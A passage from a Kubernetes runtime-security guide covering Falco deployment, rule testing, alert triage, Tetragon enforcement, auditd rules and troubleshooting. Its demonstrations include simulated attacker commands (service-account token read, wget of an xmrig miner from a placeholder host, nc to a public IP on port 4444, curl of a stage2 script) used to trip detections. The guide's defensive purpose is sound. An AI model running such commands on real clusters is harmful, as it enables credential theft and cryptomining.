| `ERROR`–`WARNING` | Alertmanager (ticket) + SIEM | 10–100 | triage next business day |
| `NOTICE`–`INFORMATIONAL` | Loki/SIEM only | 10³–10⁴ | correlation fuel, dashboards |
| `DEBUG` | dev clusters only | 10⁵+ | never in production |

### 3.6 Target workload for exercising the rules

```yaml
---
apiVersion: v1
kind: Namespace
metadata:
  name: prod-payments
  labels:
    pod-security.kubernetes.io/enforce: baseline
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payments-api
  namespace: prod-payments
  labels:
    app: payments-api
spec:
  replicas: 1
  selector:
    matchLabels:
      app: payments-api
  template:
    metadata:
      labels:
        app: payments-api
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: api
          image: docker.io/library/alpine:3.20
          command: ["/bin/sh", "-c", "while true; do sleep 30; done"]
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: false   # deliberately false, to demo drift
            capabilities:
              drop: ["ALL"]
          resources:
            requests: { cpu: 10m, memory: 32Mi }
            limits:   { cpu: 200m, memory: 128Mi }
          volumeMounts:
            - name: tmp
              mountPath: /tmp
      volumes:
        - name: tmp
          emptyDir: {}
```

---

## 4. Operating Falco from the CLI

### 4.1 Deploy and confirm the engine came up

```console
$ kubectl apply -f falco-rbac.yaml -f falco-config.yaml -f falco-rules.yaml -f falco-daemonset.yaml
namespace/falco created
serviceaccount/falco created
clusterrole.rbac.authorization.k8s.io/falco created
clusterrolebinding.rbac.authorization.k8s.io/falco created
configmap/falco-config created
configmap/falco-rules-custom created
daemonset.apps/falco created

$ kubectl -n falco rollout status ds/falco --timeout=180s
Waiting for daemon set "falco" rollout to finish: 0 of 3 updated pods are available...
daemon set "falco" successfully rolled out

$ kubectl -n falco get pods -o wide
NAME          READY   STATUS    RESTARTS   AGE   IP              NODE
falco-8f2kd   1/1     Running   0          71s   10.10.0.11      node-1
falco-dq7lm   1/1     Running   0          71s   10.10.0.12      node-2
falco-r4x9n   1/1     Running   0          71s   10.10.0.10      cp-1
```

Confirm the driver, ruleset and plugin loaded:

```console
$ kubectl -n falco logs ds/falco --tail=40
Wed Aug  5 11:02:14 2026: Falco version: 0.41.0 (x86_64)
Wed Aug  5 11:02:14 2026: Falco initialized with configuration files:
Wed Aug  5 11:02:14 2026:    /etc/falco/falco.yaml
Wed Aug  5 11:02:14 2026: System info: Linux, 5.15.0-118-generic
Wed Aug  5 11:02:14 2026: Loading plugin 'container' from file /usr/share/falco/plugins/libcontainer.so
Wed Aug  5 11:02:14 2026: Loading rules from file /etc/falco/falco_rules.yaml
Wed Aug  5 11:02:14 2026: Loading rules from file /etc/falco/rules.d/90-custom-rules.yaml
Wed Aug  5 11:02:15 2026: The chosen syscall buffer dimension is: 8388608 bytes (8 MBs)
Wed Aug  5 11:02:15 2026: Starting health webserver with threadiness 8, listening on 0.0.0.0:8765
Wed Aug  5 11:02:15 2026: Loaded event sources: syscall
Wed Aug  5 11:02:15 2026: Enabled event sources: syscall
Wed Aug  5 11:02:15 2026: Opening 'syscall' source with modern BPF probe.
Wed Aug  5 11:02:15 2026: One ring buffer every '2' CPUs.
```

The three lines you must see: **`Loading rules from file …90-custom-rules.yaml`**, **`Opening 'syscall' source with modern BPF probe`**, and no `Rule loading error`.

### 4.2 Enumerate what the engine knows

```console
$ kubectl -n falco exec ds/falco -- falco --version
Falco version: 0.41.0
Libs version:  0.20.0
Plugin API:    3.11.0
Engine:        modern_ebpf
Engine version: 0.53.0
Driver:
  API version:    8.0.0
  Schema version: 2.0.0

$ kubectl -n falco exec ds/falco -- falco -L | head -30
---------------------
Field Class: process (Process)

proc.pid              The id of the process generating the event.
proc.exe              The first command-line argument (usually the executable name or a custom string).
proc.exepath          The full executable path of the process.
proc.name             The name (excluding the path) of the executable running the process.
proc.args             The arguments passed on the command line when starting the process.
proc.cmdline          The concatenation of "proc.name + proc.args".
proc.pname            The name (excluding the path) of the parent process.
proc.tty              The controlling terminal of the process. 0 for processes without a terminal.
proc.is_exe_upper_layer  'true' if this process' executable file is in the upper layer of the overlayfs.
...

$ kubectl -n falco exec ds/falco -- falco -l "Interactive shell spawned in container"
------------------------------
Rule: Interactive shell spawned in container
Description: A shell with a controlling TTY was executed inside a container. ...
Priority: WARNING
Tags: [container, shell, mitre_execution, T1059]
Source: syscall
```

### 4.3 Validate a rules file before shipping it

Always do this before `kubectl apply`. A syntax error in a ConfigMap takes the whole DaemonSet down on the next reload.

```console
$ kubectl -n falco exec ds/falco -- falco -V /etc/falco/rules.d/90-custom-rules.yaml
Wed Aug  5 11:09:41 2026: Validating rules file(s):
Wed Aug  5 11:09:41 2026:    /etc/falco/rules.d/90-custom-rules.yaml
/etc/falco/rules.d/90-custom-rules.yaml: Ok
Ok
```

And what a failure looks like — note that Falco gives you the exact line and column:

```console
$ falco -V /tmp/broken.yaml
Wed Aug  5 11:11:02 2026: Validating rules file(s):
Wed Aug  5 11:11:02 2026:    /tmp/broken.yaml
/tmp/broken.yaml: 1 errors:
-----
Validation error in "condition": undefined macro 'spawned_proces'
Context: rule 'Interactive shell spawned in container'
   9 |   condition: >
  10 |     spawned_proces
     |     ^^^^^^^^^^^^^^
  11 |     and container
-----
```

### 4.4 Trigger the behaviour and read the alerts

Tail the alerts on the node where the target Pod runs:

```console
$ NODE=$(kubectl -n prod-payments get pod -l app=payments-api -o jsonpath='{.items[0].spec.nodeName}')
$ FALCO=$(kubectl -n falco get pod -l app.kubernetes.io/name=falco \
    --field-selector spec.nodeName=$NODE -o jsonpath='{.items[0].metadata.name}')
$ echo "$NODE -> $FALCO"
node-2 -> falco-dq7lm

$ kubectl -n falco logs -f $FALCO | jq -r 'select(.rule) | "\(.time) [\(.priority)] \(.rule) :: \(.output_fields["proc.cmdline"] // "")"'
```

In a second terminal, act like the adversary:

```console
$ POD=$(kubectl -n prod-payments get pod -l app=payments-api -o jsonpath='{.items[0].metadata.name}')

$ kubectl -n prod-payments exec -it $POD -- sh
/ $ cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 40
eyJhbGciOiJSUzI1NiIsImtpZCI6IkpXVDBf
/ $ wget -q -O /tmp/xmrig https://example.invalid/xmrig
/ $ chmod +x /tmp/xmrig
/ $ /tmp/xmrig --version
/ $ nc -zv 203.0.113.10 4444
/ $ exit
```

The tail produces:

```console
2026-08-05T11:14:03.118442901Z [Warning] Interactive shell spawned in container :: sh
2026-08-05T11:14:11.902337114Z [Critical] Service account token read by suspicious process :: cat /var/run/secrets/kubernetes.io/serviceaccount/token
2026-08-05T11:14:24.551009882Z [Notice] New executable written to container filesystem :: wget -q -O /tmp/xmrig https://example.invalid/xmrig
2026-08-05T11:14:38.220417033Z [Critical] Binary not in container image was executed (container drift) :: /tmp/xmrig --version
2026-08-05T11:14:49.774102918Z [Warning] Recon/transfer tool connected to public address :: nc -zv 203.0.113.10 4444
```

The full JSON record — this is the shape your SIEM ingests:

```console
$ kubectl -n falco logs $FALCO | jq 'select(.rule == "Binary not in container image was executed (container drift)")' | head -40
{
  "hostname": "node-2",
  "output": "Binary not in container image was executed (container drift) (time=2026-08-05T11:14:38.220417033Z user=root uid=0 exe=/tmp/xmrig cmdline=xmrig --version parent=sh container=api image=docker.io/library/alpine ns=prod-payments pod=payments-api-7c9f8d6b54-k2vzp)",
  "priority": "Critical",
  "rule": "Binary not in container image was executed (container drift)",
  "source": "syscall",
  "tags": [
    "T1204",
    "container",
    "drift",
    "mitre_execution"
  ],
  "time": "2026-08-05T11:14:38.220417033Z",
  "output_fields": {
    "container.image.repository": "docker.io/library/alpine",
    "container.name": "api",
    "evt.time.iso8601": "2026-08-05T11:14:38.220417033Z",
    "k8s.ns.name": "prod-payments",
    "k8s.pod.name": "payments-api-7c9f8d6b54-k2vzp",
    "proc.cmdline": "xmrig --version",
    "proc.exepath": "/tmp/xmrig",
    "proc.pname": "sh",
    "user.name": "root",
    "user.uid": 0
  }
}
```

### 4.5 Running a rule ad hoc — the exam pattern

The fastest way to test a single rule on a node, without touching the cluster deployment. `-M 60` bounds the run to 60 seconds so you never leave a process behind.

```console
$ cat > /tmp/one-rule.yaml <<'EOF'
- macro: spawned_process
  condition: evt.type in (execve, execveat) and evt.dir = <

- rule: Package management in container
  desc: Package manager executed inside a running container.
  condition: >
    spawned_process
    and container.id != host
    and proc.name in (apk, apt, apt-get, dnf, yum, rpm, dpkg, pip, pip3, npm)
  output: "%evt.time,%user.uid,%proc.name,%container.name,%k8s.ns.name"
  priority: WARNING
  source: syscall
EOF

$ falco -r /tmp/one-rule.yaml -o json_output=false -o buffered_outputs=false -M 60
Wed Aug  5 11:22:07 2026: Falco version: 0.41.0 (x86_64)
Wed Aug  5 11:22:07 2026: Loading rules from file /tmp/one-rule.yaml
Wed Aug  5 11:22:07 2026: Enabled event sources: syscall
Wed Aug  5 11:22:07 2026: Opening 'syscall' source with modern BPF probe.
11:22:31.443118722: Warning 11:22:31.443118722,0,apk,api,prod-payments
11:22:44.902551038: Warning 11:22:44.902551038,0,apk,api,prod-payments
Wed Aug  5 11:23:07 2026: Closing event source 'syscall'
Wed Aug  5 11:23:07 2026: Events detected: 2
Wed Aug  5 11:23:07 2026: Rule counts by severity:
   WARNING: 2
Wed Aug  5 11:23:07 2026: Triggered rules by rule name:
   Package management in container: 2
```

Two flags that matter for exam-style "write the alerts to `/opt/answer.txt`" tasks:

- `-o buffered_outputs=false` — without it, Falco buffers stdout and your file may be empty when the grader looks.
- `-o json_output=false` plus a comma-separated `output:` gives you exactly the CSV shape the task usually demands.

Persisting to a file, two ways:

```console
# (a) Falco's own file output
$ falco -r /tmp/one-rule.yaml \
        -o json_output=false \
        -o buffered_outputs=false \
        -o stdout_output.enabled=false \
        -o file_output.enabled=true \
        -o file_output.filename=/opt/incident.log \
        -M 45

$ cat /opt/incident.log
11:31:02.118442901: Warning 11:31:02.118442901,0,apk,api,prod-payments

# (b) shell redirection of the running DaemonSet, filtered with jq
$ kubectl -n falco logs $FALCO --since=10m \
  | jq -r 'select(.rule=="Package management in container")
           | [.time, .output_fields["user.uid"], .output_fields["proc.name"],
              .output_fields["k8s.ns.name"], .output_fields["k8s.pod.name"]]
           | @csv' > /opt/incident.log
```

### 4.6 Hot reload

Falco ships `watch_config_files: true`, so editing a rules file on disk triggers a reload within seconds. In Kubernetes, ConfigMap propagation to the mounted volume takes up to `kubelet --sync-frequency` (default 60s) plus cache TTL — so it works, but it is not instant.

```console
$ kubectl -n falco create configmap falco-rules-custom \
    --from-file=90-custom-rules.yaml=./90-custom-rules.yaml \
    --dry-run=client -o yaml | kubectl apply -f -
configmap/falco-rules-custom configured

# Wait for the projected volume to update, or force it:
$ kubectl -n falco rollout restart ds/falco
daemonset.apps/falco restarted

# On a bare-metal / systemd node the equivalent is:
$ sudo systemctl reload falco       # sends SIGHUP
$ sudo systemctl restart falco      # full restart
$ sudo journalctl -u falco -f --since "5 min ago"
```

### 4.7 Generating traffic deterministically

Do not improvise attacker behaviour when you are validating a pipeline. Use the upstream generator:

```console
$ kubectl -n prod-payments run event-generator --restart=Never \
    --image=docker.io/falcosecurity/event-generator:latest \
    -- run syscall --loop
pod/event-generator created

$ kubectl -n falco logs $FALCO --tail=8 | jq -r '"\(.priority)\t\(.rule)"'
Notice   Create files below dev
Warning  Read sensitive file untrusted
Notice   Write below binary dir
Error    Change thread namespace
Warning  Non sudo setuid
Notice   Directory traversal monitored file read
Warning  Search private keys or passwords
Notice   Write below etc

$ kubectl -n prod-payments delete pod event-generator
pod "event-generator" deleted
```

---

## 5. Offline analysis: capture once, iterate on rules forever

Rule development against live traffic is slow and non-reproducible. Capture a `.scap` file during an incident (or during a red-team exercise) and replay it as many times as you need.

```console
# Capture 120 seconds of raw syscall activity on the node
$ sudo sysdig -w /var/tmp/incident-20260805.scap -M 120
$ ls -lh /var/tmp/incident-20260805.scap
-rw-r--r--. 1 root root 412M Aug  5 11:41 /var/tmp/incident-20260805.scap

# Replay it through any ruleset — no kernel involvement, fully deterministic
$ falco -e /var/tmp/incident-20260805.scap -r /tmp/one-rule.yaml -o json_output=false
Wed Aug  5 11:44:19 2026: Falco version: 0.41.0 (x86_64)
Wed Aug  5 11:44:19 2026: Reading from capture file /var/tmp/incident-20260805.scap
11:39:02.118442901: Warning 11:39:02.118442901,0,apk,api,prod-payments
Wed Aug  5 11:44:23 2026: Events detected: 1
```

You can also slice the capture directly with `sysdig`'s filter language — the same syntax Falco conditions use:

```console
$ sysdig -r /var/tmp/incident-20260805.scap -p"%evt.time %container.name %proc.name %proc.cmdline" \
    "evt.type=execve and evt.dir=< and container.id!=host"
11:39:00.881233 api sh sh
11:39:02.118442 api apk apk add curl
11:39:07.554901 api curl curl -sSL https://example.invalid/stage2.sh

# Aggregate: which containers spawned the most processes?
$ sysdig -r /var/tmp/incident-20260805.scap -c topprocs_cpu "container.name=api"
CPU%   Process     PID     Container
------------------------------------
18.42% xmrig       21883   api
 1.03% sh          21501   api
 0.11% apk         21744   api
```

---

## 6. Alternatives and where each one belongs

### 6.1 Tetragon — eBPF observation *with in-kernel enforcement*

Falco detects. Tetragon can detect **and kill**, synchronously, from inside the kernel, closing the detect-to-respond gap from seconds to microseconds.

```yaml
---
apiVersion: cilium.io/v1alpha1
kind: TracingPolicyNamespaced
metadata:
  name: block-serviceaccount-token-read
  namespace: prod-payments
spec:
  kprobes:
    - call: "security_file_permission"
      syscall: false
      return: true
      args:
        - index: 0
          type: "file"
        - index: 1
          type: "int"
      returnArg:
        index: 0
        type: "int"
      returnArgAction: "Post"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Prefix"
              values:
                - "/var/run/secrets/kubernetes.io/serviceaccount"
            - index: 1
              operator: "Equal"
              values:
                - "4"          # MAY_READ
          matchBinaries:
            - operator: "NotIn"
              values:
                - "/usr/local/bin/payments-api"
          matchActions:
            - action: Sigkill    # in-kernel termination, not a log line
```

```console
$ kubectl apply -f tetragon-policy.yaml
tracingpolicynamespaced.cilium.io/block-serviceaccount-token-read created

$ kubectl -n kube-system exec ds/tetragon -c tetragon -- \
    tetra getevents -o compact --namespace prod-payments
🚀 process prod-payments/payments-api-7c9f8d6b54-k2vzp /bin/sh
🚀 process prod-payments/payments-api-7c9f8d6b54-k2vzp /bin/cat /var/run/secrets/kubernetes.io/serviceaccount/token
📚 read    prod-payments/payments-api-7c9f8d6b54-k2vzp /bin/cat /var/run/secrets/kubernetes.io/serviceaccount/token
💥 exit    prod-payments/payments-api-7c9f8d6b54-k2vzp /bin/cat /var/run/secrets/kubernetes.io/serviceaccount/token SIGKILL
```

### 6.2 auditd — the host-level plane the exam still tests

Kubernetes nodes are Linux hosts. Tampering with `/etc/kubernetes/manifests`, `/var/lib/kubelet/config.yaml` or the CA keys is a control-plane compromise that no container-scoped tool sees.

```bash
# /etc/audit/rules.d/50-k8s-node.rules
## Delete existing rules and set the buffer
-D
-b 8192
--backlog_wait_time 60000

## Kubernetes configuration and PKI — write and attribute changes
-w /etc/kubernetes/                    -p wa -k k8s-config
-w /etc/kubernetes/pki/                -p wa -k k8s-pki
-w /var/lib/kubelet/config.yaml        -p wa -k kubelet-config
-w /var/lib/kubelet/pki/               -p wa -k kubelet-pki
-w /etc/kubernetes/manifests/          -p wa -k static-pods

## Container runtime configuration and state
-w /etc/containerd/config.toml         -p wa -k containerd-config
-w /etc/crictl.yaml                    -p wa -k crictl-config
-w /var/lib/containerd/                -p wa -k containerd-state

## Runtime binaries
-w /usr/bin/containerd                 -p x  -k container-runtime-exec
-w /usr/bin/runc                       -p x  -k container-runtime-exec
-w /usr/bin/crictl                     -p x  -k container-runtime-exec
-w /usr/bin/kubectl                    -p x  -k kubectl-exec

## Kernel module manipulation — classic escape/rootkit persistence
-a always,exit -F arch=b64 -S init_module,finit_module,delete_module -k kernel-modules

## Namespace manipulation from a non-root uid
-a always,exit -F arch=b64 -S setns,unshare -F auid>=1000 -F auid!=-1 -k namespace-manipulation

## Privilege escalation
-a always,exit -F arch=b64 -S execve -C uid!=euid -F euid=0 -k setuid-exec

## Make the ruleset immutable until reboot (audit best practice)
-e 2
```

```console
$ sudo augenrules --load
$ sudo auditctl -s
enabled 2
failure 1
pid 1188
rate_limit 0
backlog_limit 8192
lost 0
backlog 0
backlog_wait_time 60000

$ sudo auditctl -l | head -5
-w /etc/kubernetes -p wa -k k8s-config
-w /etc/kubernetes/pki -p wa -k k8s-pki
-w /var/lib/kubelet/config.yaml -p wa -k kubelet-config
-w /var/lib/kubelet/pki -p wa -k kubelet-pki
-w /etc/kubernetes/manifests -p wa -k static-pods

# Someone drops a static Pod on the control plane:
$ sudo ausearch -k static-pods -i --start recent
----
type=PROCTITLE msg=audit(08/05/2026 11:52:44.201:8812) : proctitle=vi /etc/kubernetes/manifests/backdoor.yaml
type=PATH msg=audit(08/05/2026 11:52:44.201:8812) : item=1 name=/etc/kubernetes/manifests/backdoor.yaml
    inode=262401 dev=fd:00 mode=file,644 ouid=root ogid=root nametype=CREATE
type=CWD msg=audit(08/05/2026 11:52:44.201:8812) : cwd=/root
type=SYSCALL msg=audit(08/05/2026 11:52:44.201:8812) : arch=x86_64 syscall=openat
    success=yes exit=4 ppid=41022 pid=41190 auid=deploy uid=root gid=root euid=root
    suid=root fsuid=root comm=vi exe=/usr/bin/vim.basic key=static-pods

$ sudo aureport -k --summary
Key Summary Report
===========================
total  key
===========================
   142  k8s-config
    88  container-runtime-exec
    31  static-pods
     4  kernel-modules
     1  namespace-manipulation
```

`auid=deploy` is the crucial field: it is the **login uid**, immutable after login, and it survives `sudo` and `su`. `uid=root` tells you nothing about who is responsible; `auid` does.

### 6.3 Baseline recording with the Security Profiles Operator

This is the "learn normal, then freeze it" half of behavioral analytics.

```yaml
---
apiVersion: security-profiles-operator.x-k8s.io/v1alpha1
kind: ProfileRecording
metadata:
  name: payments-api-baseline
  namespace: prod-payments
spec:
  kind: SeccompProfile
  recorder: bpf              # `logs` uses audit records instead; bpf is lower overhead
  podSelector:
    matchLabels:
      app: payments-api
```

```console
$ kubectl label ns prod-payments spo.x-k8s.io/enable-recording=true
namespace/prod-payments labeled

$ kubectl apply -f profilerecording.yaml
profilerecording.security-profiles-operator.x-k8s.io/payments-api-baseline created

$ kubectl -n prod-payments rollout restart deploy/payments-api
deployment.apps/payments-api restarted

# ... drive representative production traffic for a full business cycle ...

$ kubectl delete profilerecording -n prod-payments payments-api-baseline
profilerecording.security-profiles-operator.x-k8s.io "payments-api-baseline" deleted

$ kubectl -n prod-payments get seccompprofile
NAME                            STATUS      AGE
payments-api-baseline-api       Installed   14s

$ kubectl -n prod-payments get seccompprofile payments-api-baseline-api -o yaml | head -30
apiVersion: security-profiles-operator.x-k8s.io/v1beta1
kind: SeccompProfile
metadata:
  name: payments-api-baseline-api
  namespace: prod-payments
spec:
  architectures:
    - SCMP_ARCH_X86_64
  defaultAction: SCMP_ACT_ERRNO
  syscalls:
    - action: SCMP_ACT_ALLOW
      names:
        - accept4
        - access
        - arch_prctl
        - bind
        - brk
        - clock_gettime
        - clone3
        - close
        - connect
        - epoll_create1
        - epoll_ctl
        - epoll_pwait
        - execve
        ...
```

The recorded profile is then attached with `securityContext.seccompProfile.type: Localhost`. **Never ship a recorded profile straight to production**: a recording captures only the paths that were exercised. Run it in `SCMP_ACT_LOG` mode first and watch the audit log for denials that would have occurred.

### 6.4 Comparison matrix

| | **Falco** | **Tetragon** | **auditd** | **KubeArmor** | **Inspektor Gadget** |
|---|---|---|---|---|---|
| Primary purpose | detection | detection + enforcement | host audit trail | policy enforcement | ad-hoc debugging & profiling |
| Data source | syscalls (eBPF/kmod) | eBPF kprobes/LSM/tracepoints | kernel audit subsystem | LSM (BPF-LSM/AppArmor/SELinux) | eBPF gadgets |
| Enforcement | no (detection only) | **yes** (`Sigkill`, `Override`) | no | **yes** (block/audit) | no |
| K8s enrichment | container plugin + optional k8smeta | native, Cilium-integrated | none (host-only) | native | native |
| Rule language | sysdig filter DSL | `TracingPolicy` CRD | auditctl rules | `KubeArmorPolicy` CRD | CLI flags |
| Overhead | low (1–3% CPU/node typical) | low | **can be high** (`-a always,exit -S execve` on a busy node) | low | on-demand |
| CNCF status | **Graduated** | Incubating (Cilium) | not CNCF (Linux) | Incubating | Sandbox |
| Detection latency | ms (async, post-hoc) | µs (in-kernel, synchronous) | ms | µs | n/a |
| Learning/baselining | no | no | no | partial | **yes** (`advise seccomp-profile`, `advise network-policy`) |
| **CKS exam relevance** | **very high** | low | **medium** | low | low |

Practical guidance: **Falco for detection breadth, Tetragon for surgical enforcement on your highest-value workloads, auditd for the host and control plane, SPO/Inspektor Gadget to derive the baselines.** They are complementary layers, not competitors.

### 6.5 Mapping rules to MITRE ATT&CK for Containers

Coverage should be argued in ATT&CK terms, not in "number of rules".

| Tactic | Technique | Observable signal | Rule shown above |
|---|---|---|---|
| Initial Access | T1190 Exploit Public-Facing App | webserver process spawns a shell | *Interactive shell spawned in container* |
| Execution | T1059 Command & Scripting Interpreter | `execve` of a shell binary | *Interactive shell spawned in container* |
| Execution | T1204 User Execution | `proc.is_exe_upper_layer = true` | *Drifted binary executed in container* |
| Persistence | T1105 Ingress Tool Transfer | write to `/tmp`, `/dev/shm`, bin dirs | *New executable written to container filesystem* |
| Privilege Escalation | T1611 Escape to Host | `setns`, `unshare`, `mount`, `init_module` | *Container escape primitive observed* |
| Privilege Escalation | T1548 Abuse Elevation Control | `setuid(0)` from non-root | *Privilege escalation to root inside container* |
| Credential Access | T1552.001 Credentials In Files | read of the SA token path | *Service account token read by unexpected process* |
| Discovery | T1613 Container & Resource Discovery | `kubectl`/`crictl` exec inside a container | extend *Interactive shell* with those binaries |
| Command & Control | T1071 Application Layer Protocol | `connect` to a public IP from a recon tool | *Recon tool connected to public address* |
| Impact | T1496 Resource Hijacking | drifted binary + sustained CPU | drift rule + Prometheus CPU correlation |

---

## 7. Verification and failure diagnosis

This section is the difference between a Falco that *appears* to work and a Falco you would trust during an incident.

### 7.1 Health checklist

```console
# 1. Every node has a running agent
$ kubectl -n falco get ds falco
NAME    DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   AGE
falco   3         3         3       3            3           41m

# 2. The health endpoint answers
$ kubectl -n falco exec ds/falco -- curl -sS localhost:8765/healthz
{"healthy":true}

# 3. Your rules are actually loaded (not just present in the ConfigMap)
$ kubectl -n falco logs ds/falco | grep -E "Loading rules|Rule loading|error"
Wed Aug  5 11:02:14 2026: Loading rules from file /etc/falco/falco_rules.yaml
Wed Aug  5 11:02:14 2026: Loading rules from file /etc/falco/rules.d/90-custom-rules.yaml

# 4. The specific rule exists in the loaded engine
$ kubectl -n falco exec ds/falco -- falco -l "Drifted binary executed in container"
------------------------------
Rule: Drifted binary executed in container
Priority: CRITICAL

# 5. It fires end to end
$ kubectl -n prod-payments exec $POD -- sh -c 'cp /bin/ls /tmp/ls2 && /tmp/ls2 /'
$ kubectl -n falco logs $FALCO --since=1m | jq -r 'select(.rule|test("Drifted")) | .output'
Binary not in container image was executed (container drift) (time=... exe=/tmp/ls2 ...)
```

**Only step 5 proves anything.** Steps 1–4 are necessary, not sufficient. Institutionalize step 5: a CronJob that trips one benign canary rule per hour and an alert on its *absence* is the single highest-value operational control in this domain.

```yaml
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: falco-canary
  namespace: falco
spec:
  schedule: "*/15 * * * *"
  concurrencyPolicy: Forbid
  successfulJobsHistoryLimit: 1
  failedJobsHistoryLimit: 3
  jobTemplate:
    spec:
      backoffLimit: 1
      template:
        spec:
          restartPolicy: Never
          securityContext:
            runAsNonRoot: true
            runAsUser: 65534
            seccompProfile:
              type: RuntimeDefault
          containers:
            - name: canary
              image: docker.io/library/busybox:1.36
              command:
                - /bin/sh
                - -c
                - |
                  # Deliberately trips "New executable written to container filesystem"
                  cp /bin/true /tmp/falco-canary-$(date +%s)
                  chmod +x /tmp/falco-canary-*
                  /tmp/falco-canary-* || true
              securityContext:
                allowPrivilegeEscalation: false
                capabilities:
                  drop: ["ALL"]
              resources:
                requests: { cpu: 10m, memory: 16Mi }
                limits:   { cpu: 50m, memory: 32Mi }
```

Pair it with an alerting rule that fires when the canary detection is *missing*:

```yaml
---
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: falco-pipeline-health
  namespace: falco
spec:
  groups:
    - name: falco.pipeline
      rules:
        - alert: FalcoDetectionPipelineDead
          expr: |
            sum(increase(falcosecurity_falcosidekick_falco_events_total{priority="notice"}[30m])) == 0
          for: 15m
          labels:
            severity: critical
          annotations:
            summary: "Falco canary has not produced an event in 30 minutes"
            description: >
              The falco-canary CronJob trips a NOTICE rule every 15 minutes.
              Zero events means the detection pipeline is broken somewhere between
              the kernel driver and Falcosidekick — treat as a security outage.

        - alert: FalcoSyscallEventDrops
          expr: |
            rate(falcosecurity_evt_hostname_n_drops_total[5m]) > 0
          for: 10m
          labels:
            severity: warning
          annotations:
            summary: "Falco is dropping syscall events on {{ $labels.hostname }}"
            description: "Dropped events are undetected events. Increase buf_size_preset or narrow base_syscalls."
```

### 7.2 Diagnostic decision table

| Symptom | Probable cause | Command to confirm | Fix |
|---|---|---|---|
| Pod `CrashLoopBackOff`, log `Runtime error: can't open device /dev/falco0` | kernel module not loaded | `lsmod \| grep falco` | run the driver-loader initContainer, or switch to `modern_ebpf` |
| Log: `Unable to load the driver … BTF not available` | `CONFIG_DEBUG_INFO_BTF` off | `ls /sys/kernel/btf/vmlinux` | fall back to `ebpf` or `kmod` |
| Log: `bpf: failed to load program … permission denied` | missing `CAP_BPF`/`CAP_PERFMON` | `kubectl -n falco get pod $FALCO -o jsonpath='{.spec.containers[0].securityContext}'` | add capabilities, or `privileged: true` |
| Rules file present but never loaded | not listed in `rules_files`, or `rules.d` not mounted | `kubectl -n falco logs ds/falco \| grep "Loading rules"` | fix `rules_files`, verify volumeMount path |
| `Rule loading error: undefined macro` | macro defined after use, or in a file loaded later | `falco -V <file>` | define macros above rules, order `rules_files` correctly |
| `Rule loading error: rule 'X' already exists` | same rule name in two files without `override` | `grep -rn "rule: X" /etc/falco/` | rename, or add the `override:` block |
| Rule loads but never fires | `priority` in `falco.yaml` is above the rule's priority | `kubectl -n falco exec ds/falco -- grep '^priority' /etc/falco/falco.yaml` | lower the global `priority` |
| Rule loads but never fires (2) | required syscall not traced | `kubectl -n falco logs ds/falco \| grep -i "base_syscalls"` | set `base_syscalls.repair: true`, or run with `-A` |
| Rule loads but never fires (3) | exec rule uses `evt.dir = >` | read the condition | exec rules **must** use `evt.dir = <` |
| Rule loads but never fires (4) | upstream `override: condition: append` excluded it | `falco -l "<rule>"` and inspect the effective condition | reorder or narrow the exclusion |
| `%container.name` is `host` for containerized processes | CRI socket not mounted, or wrong path | `kubectl -n falco exec ds/falco -- ls -l /run/containerd/containerd.sock` | mount the correct runtime socket |
| `%k8s.ns.name` and `%k8s.pod.name` are `<NA>` | container metadata missing (same root cause as above) | as above | as above |
| `%k8s.deployment.name` / `%k8s.pod.label[...]` empty | requires the `k8smeta` plugin + `k8s-metacollector` | `kubectl -n falco get deploy k8s-metacollector` | deploy the metacollector and load the plugin |
| `Falco internal: syscall event drop. 12% of events dropped` | ring buffer overflow | see §7.3 | see §7.3 |
| Alerts appear in `kubectl logs` but not in Slack | Falcosidekick `MINIMUMPRIORITY` filter | `kubectl -n falco logs deploy/falcosidekick` | lower `*_MINIMUMPRIORITY` |
| `/opt/answer.txt` empty after a timed run | stdout buffering | — | `-o buffered_outputs=false` |
| Timestamps in alerts do not match `kubectl` events | node clock skew | `chronyc tracking` on the node | fix NTP; skew destroys cross-plane correlation |

### 7.3 Syscall event drops — the silent failure

```console
$ kubectl -n falco logs $FALCO | grep -i drop
Wed Aug  5 12:03:44 2026: Falco internal: syscall event drop. 14 drops, 12.4% of total events
Wed Aug  5 12:03:44 2026: Falco internal: syscall event drop. 41 drops, 18.9% of total events
```

**Every dropped event is an undetected event.** This is not a performance warning; it is a security gap. Triage in this order:

1. **Confirm the magnitude** from the metrics endpoint rather than the log sampling:

```console
$ kubectl -n falco exec ds/falco -- curl -sS localhost:8765/metrics | grep -E "n_drops|n_evts"
falcosecurity_scap_n_evts_total{...} 8.412993e+06
falcosecurity_scap_n_drops_total{...} 1.03911e+05
falcosecurity_scap_n_drops_buffer_total{...} 1.03911e+05
```

2. **Reduce what you ask the kernel for.** `base_syscalls.repair: true` computes the minimal set your rules need. Disabling unused upstream rules directly shrinks the traced syscall set — this is usually a 5–10× reduction and is the highest-leverage fix.

3. **Enlarge the ring buffers.** `buf_size_preset` is an index, not bytes: `1`=1MB, `2`=2MB, `3`=4MB, `4`=8MB (default), `5`=16MB, `6`=32MB … up to `10`=512MB **per buffer**. With `cpus_for_each_buffer: 2` on a 64-core node you have 32 buffers; moving from preset 4 to 6 takes locked memory from 256 MB to 1 GB per node. Budget it deliberately.

4. **Spread buffers over fewer CPUs.** `cpus_for_each_buffer: 1` gives one buffer per CPU — maximum throughput, maximum memory.

5. **Consider `drop_failed_exit: true`.** Discards events for syscalls that returned an error. Cheap, and usually safe — but it *will* hide failed-attempt reconnaissance (e.g. an attacker probing paths that do not exist). Decide explicitly.

| Knob | Effect on drops | Cost | Risk |
|---|---|---|---|
| Disable unused rules / `base_syscalls.repair` | **large** | none | you must know which rules you disabled |
| `buf_size_preset` ↑ | large | locked memory, linear | node memory pressure, OOM |
| `cpus_for_each_buffer` ↓ | moderate | more memory | as above |
| `drop_failed_exit: true` | moderate | none | loses failed-syscall visibility |
| `syscall_event_drops.actions: [ignore]` | **zero** | none | **hides the problem — do not do this** |

### 7.4 Measuring rule cost

